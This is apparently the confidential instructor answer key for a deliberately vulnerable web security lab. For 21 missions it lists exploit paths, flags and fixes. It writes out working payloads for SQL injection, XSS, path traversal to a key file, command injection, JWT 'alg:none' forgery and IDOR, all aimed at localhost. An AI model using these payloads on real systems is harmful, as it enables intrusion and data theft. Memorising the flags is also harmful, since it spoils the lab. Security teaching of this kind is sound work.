# Cyberflex Security Missions Lab — Comprehensive Instructor Guide

> **CONFIDENTIAL INSTRUCTOR DOCUMENTATION**  
> This guide contains complete solution pathways, vulnerable code root causes, remediation diffs, and flags for all 20 missions and defensive exercises. Do not distribute to students.

---

## Pedagogical Philosophy & Workflow

The Cyberflex laboratory is designed to transition students away from tool-only "button-pushing" and toward systematic, evidence-driven penetration testing and defensive engineering.

The laboratory enforces the 10-step industry workflow:
```
Reconnaissance → Enumeration → Vulnerability Discovery → Validation → Exploitation
      ↓
Impact Analysis → Evidence Collection → Reporting → Remediation → Retesting
```

---

## Mission Solutions & Instructor Reference

### LEVEL 1 — SECURITY APPRENTICE (BEGINNER)

#### Mission 01 — The First Look
* **Topic**: Passive Reconnaissance & Information Gathering
* **Learning Objectives**: Understand HTTP headers, server fingerprinting, and search engine directives (`robots.txt`).
* **Vulnerable Component**: `server/server.js` (Custom response headers and public `robots.txt`).
* **Why it exists**: Developers or infrastructure teams leaving internal build numbers, debugging headers, or unlinked endpoints in crawl directives.
* **Exploitation Path**:
  1. Inspect response headers using `curl -I http://localhost:3000/` or Browser DevTools (Network tab).
  2. View `http://localhost:3000/robots.txt`.
* **Flag**: `CFX{r3c0n_f1rst_st3p_d1sc0v3r}`
* **Common Mistakes**: Only viewing the visual web page rather than HTTP headers or `robots.txt`.
* **Remediation**: Strip custom debugging headers in production; do not rely on `robots.txt` for security through obscurity.
* **Discussion Questions**: Why is security through obscurity ineffective for sensitive endpoints?

---

#### Mission 02 — What's Behind the Door?
* **Topic**: Directory and Endpoint Discovery
* **Learning Objectives**: Discover unlinked administrative routes leaked in reconnaissance artifacts.
* **Vulnerable Component**: `server/server.js` (`/internal/system-status`).
* **Why it exists**: Legacy monitoring endpoint exposed on the public port without an authentication proxy.
* **Exploitation Path**:
  1. Navigate to `http://localhost:3000/internal/system-status` identified from `robots.txt`.
  2. Inspect JSON output.
* **Flag**: `CFX{h1dd3n_d00rs_unl0ck3d}`
* **Remediation**: Enforce strict gateway authentication and restrict internal monitoring interfaces to localhost or internal management networks.

---

#### Mission 03 — The Strange Search
* **Topic**: SQL Injection (SQLi)
* **Learning Objectives**: Understand dynamic SQL string concatenation and UNION SELECT data exfiltration.
* **Vulnerable Component**: `server/vulnerabilities/vulnerabilityEngine.js` (`searchProducts()`).
* **Why it exists**: Input concatenated into `SELECT ... WHERE name LIKE '%${query}%'`.
* **Exploitation Path**:
  1. Test input with `'` or `' OR 1=1 --`.
  2. Inject UNION payload:
     `' UNION SELECT id, secret_name, classification, secret_value, 'vault', 0 FROM secret_vault --`
* **Flag**: `CFX{un10n_s3l3ct_m4st3r_sq11}`
* **Remediation**: Parameterized queries using prepared statements:
  ```javascript
  db.all('SELECT id, name, category, price, description, stock FROM products WHERE (name LIKE ? OR category LIKE ?) AND is_confidential = 0', [`%${q}%`, `%${q}%`]);
  ```

---

#### Mission 04 — A Message From Someone Else
* **Topic**: Reflected Cross-Site Scripting (XSS)
* **Learning Objectives**: Understand unsanitized parameter reflection into HTML and DOM contexts.
* **Vulnerable Component**: `public/support.html` & `server/controllers/portalController.js` (`searchSupport()`).
* **Exploitation Path**:
  1. Search for `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`.
  2. Observe raw HTML reflection in DOM banner.
* **Flag**: `CFX{r3fl3ct3d_scr1pt_3x3cut3d}`
* **Remediation**: Context-aware HTML entity encoding (`&lt;`, `&gt;`, `&quot;`) before rendering user parameters.

---

#### Mission 05 — The Comment Nobody Sanitized
* **Topic**: Stored Cross-Site Scripting (Persistent XSS)
* **Learning Objectives**: Identify risks of storing unescaped user content in databases and rendering it to other users.
* **Vulnerable Component**: `public/comments.html` & `server/controllers/portalController.js` (`postComment()`).
* **Exploitation Path**:
  1. Submit a product review containing `<img src=x onerror=fetch("/flag")>`.
  2. Simulated admin review crawler inspects the comment and logs execution flag.
* **Flag**: `CFX{st0r3d_xss_p3rs1st3nt_thr34t}`
* **Remediation**: Sanitize inputs using an established library (e.g. DOMPurify) and encode output in views.

---

#### Mission 06 — Who Am I?
* **Topic**: Authentication Weaknesses & Information Disclosure
* **Learning Objectives**: Exploit verbose error messages for username enumeration and identify default administrative credentials.
* **Vulnerable Component**: `server/controllers/authController.js` (`login()`).
* **Exploitation Path**:
  1. Submit unknown username `alice` → responds `"User does not exist."`.
  2. Submit `admin` → responds `"Incorrect password."` (confirming `admin` exists).
  3. Try default password `admin` → login succeeds.
* **Flag**: `CFX{w34k_cr3ds_br0k3n_4uth}`
* **Remediation**: Use generic error message `"Invalid username or password"`, enforce strong password policies, and implement rate-limiting/account lockout.

---

#### Mission 07 — That's Not My Account
* **Topic**: Insecure Direct Object Reference (IDOR)
* **Learning Objectives**: Detect broken access control where database records are fetched by sequential IDs without ownership checks.
* **Vulnerable Component**: `server/controllers/portalController.js` (`getOrderById()`).
* **Exploitation Path**:
  1. Inspect legitimate orders (`/api/orders/1`).
  2. Request `/api/orders/3` to view confidential contract belonging to user 3 (`sarah.connor`).
* **Flag**: `CFX{1d0r_d1r3ct_0bj3ct_3xp0s3d}`
* **Remediation**: Validate that the requesting user owns the object:
  ```javascript
  if (order.user_id !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Access Denied' });
  }
  ```

---

### LEVEL 2 — SECURITY ANALYST (INTERMEDIATE)

#### Mission 08 — Forged Request
* **Topic**: Parameter Manipulation & Price Tampering
* **Vulnerable Component**: `server/controllers/portalController.js` (`createOrder()`).
* **Exploitation Path**: Submit order with `customPrice: 1.00` on product ID 4 ($5,000 HSM).
* **Flag**: `CFX{p4r4m_m4n1pul4t10n_succ3ss}`
* **Remediation**: Look up product pricing strictly server-side from the database; never trust client-supplied prices.

---

#### Mission 09 — The Untrusted Upload
* **Topic**: Insecure File Upload
* **Vulnerable Component**: `server/routes/portalRoutes.js` (`/api/upload/avatar`).
* **Exploitation Path**: Upload an HTML or SVG file containing script tags.
* **Flag**: `CFX{f1l3_upl04d_byp4ss_c0mpl3t3}`
* **Remediation**: Validate file extension against a strict whitelist (e.g. `.png`, `.jpg`), inspect magic bytes, rename files randomly, and store in a non-executable directory.

---

#### Mission 10 — Walking Through the Files
* **Topic**: Path Traversal (Directory Traversal)
* **Vulnerable Component**: `server/vulnerabilities/vulnerabilityEngine.js` (`readDocument()`).
* **Exploitation Path**: Request `http://localhost:3000/api/documents/view?file=../../server/config/secret.key`.
* **Flag**: `CFX{d0t_d0t_sl4sh_tr4v3rs4l}`
* **Remediation**: Canonical path verification:
  ```javascript
  const safeTarget = path.resolve(baseDir, path.basename(fileName));
  if (!safeTarget.startsWith(baseDir)) throw new Error('Traversal attempt blocked.');
  ```

---

#### Mission 11 — The Forgotten Endpoint
* **Topic**: API Enumeration & Legacy Route Leakage
* **Vulnerable Component**: `server/routes/portalRoutes.js` (`/api/v1/legacy/export-users`).
* **Exploitation Path**: Enumerate `/api/v1/` routes; request `/api/v1/legacy/export-users`.
* **Flag**: `CFX{4p1_3num3r4t10n_l34k}`
* **Remediation**: Deprecate and completely decommission legacy API routes; enforce global authentication across all versions.

---

#### Mission 12 — Trust the Token?
* **Topic**: JWT Algorithm Confusion & Weak Secret Key
* **Vulnerable Component**: `server/middleware/auth.js` (`authMiddleware`).
* **Exploitation Path**: Forge JWT with `{"alg":"none"}` and payload `{"role":"admin"}` or sign using weak secret `"secret123"`. Request `/api/jwt/admin-report`.
* **Flag**: `CFX{jwt_t0k3n_f0rg3ry_pwn}`
* **Remediation**: Reject `alg: none`, enforce strong 256-bit random secrets stored in environment variables, and use asymmetric verification (RS256).

---

#### Mission 13 — The Missing Protection
* **Topic**: Cross-Site Request Forgery (CSRF)
* **Vulnerable Component**: `server/controllers/portalController.js` (`updateEmail()`).
* **Exploitation Path**: Trigger state-changing POST to `/api/user/update-email` without anti-CSRF token.
* **Flag**: `CFX{csrf_st4t3_ch4ng1ng_3xpl01t}`
* **Remediation**: Implement synchronizer token pattern (anti-CSRF tokens) and set cookies with `SameSite=Strict`.

---

#### Mission 14 — Behind the Command
* **Topic**: Sandboxed Command Injection
* **Vulnerable Component**: `server/vulnerabilities/vulnerabilityEngine.js` (`runSandboxedDiagnostics()`).
* **Exploitation Path**: Submit target `127.0.0.1; cat flag.txt` or `127.0.0.1 & dir` into administrative ping tool.
* **Flag**: `CFX{s4ndb0x_cm1_d14gn0st1cs_fl4g}`
* **Remediation**: Do not invoke system shells; use structured APIs or strict regex validation (`/^[a-zA-Z0-9.-]+$/`).

---

### LEVEL 3 — PENETRATION TESTER (ADVANCED)

#### Mission 15 — Chain Reaction
* **Topic**: Multi-Stage Vulnerability Chaining
* **Exploitation Path**:
  1. Query `/api/users/profile?id=1` (IDOR) to find Admin recovery PIN `849201`.
  2. Call `/api/auth/reset-password` with PIN `849201` to change admin password.
  3. Log in as admin and access `/api/vault/audit-records`.
* **Flag**: `CFX{ch41n3d_3xpl01t_m4st3ry}`

---

#### Mission 16 — API Breach
* **Topic**: Mass Assignment & Privilege Escalation
* **Vulnerable Component**: `server/controllers/portalController.js` (`updateProfileV2()`).
* **Exploitation Path**: Send POST to `/api/v2/users/update` with `{"role": "admin"}`.
* **Flag**: `CFX{m4ss_4ss1gnm3nt_4p1_br34ch}`
* **Remediation**: Whitelist permitted client-updatable fields.

---

#### Mission 17 — The Admin Problem
* **Topic**: Broken Function Level Authorization (BFLA)
* **Vulnerable Component**: `server/controllers/portalController.js` (`systemMaintenance()`).
* **Exploitation Path**: Call `/api/admin/system-maintenance` using a normal customer account.
* **Flag**: `CFX{bfl4_4dm1n_funct10n_3xp0s3d}`
* **Remediation**: Implement `requireAdmin` middleware on all administrative route handlers.

---

#### Mission 18 — Full Security Assessment
* **Topic**: Black-Box Pentest Methodology
* **Exploitation Path**: Enumerate `/api/support/tickets/99/attachments` to access confidential board audit attachment.
* **Flag**: `CFX{full_sc0p3_p3nt3st_v3r1f13d}`

---

#### Mission 19 — Find the Unknown
* **Topic**: Zero-Day Business Logic Vulnerability
* **Exploitation Path**: Submit promo code `OVERFLOW2026` or quantity `-1` to `/api/orders`.
* **Flag**: `CFX{z3r0_d4y_l0g1c_fl4w_d1sc0v3r3d}`
* **Remediation**: Validate quantities are positive integers (`quantity > 0`) and promo codes are validated against an active database lookup.

---

#### Mission 20 — Final Assessment (Capstone)
* **Topic**: Capstone Penetration Test
* **Exploitation Path**: Request `/recovery/master-backup` with internal mesh proxy header `X-Cyberflex-Internal: true`.
* **Flag**: `CFX{c4pst0n3_m4st3r_p3nt3st3r_c3rt}`

---

#### Mission 21 — Defensive Mode: Patch The Application
* **Topic**: Secure Coding & Patch Verification
* **Objective**: Enable runtime patches for SQLi and Path Traversal on `defensive.html`, re-test, and observe payload neutralization.
* **Flag**: `CFX{p4tch_v3r1f13d_s3cur3_c0d1ng}`
